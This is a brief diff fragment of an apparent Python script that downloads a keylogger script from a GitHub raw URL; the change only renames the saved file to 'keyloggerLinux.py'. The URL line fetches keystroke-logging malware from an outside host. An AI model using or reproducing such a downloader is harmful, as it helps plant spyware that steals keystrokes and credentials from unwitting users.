@@ -3,7 +3,7 @@ import requests
 
 url = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/keylogger.py'
 
-filename = 'keylogger.py'
+filename = 'keyloggerLinux.py'
 
 response = requests.get(url)
 
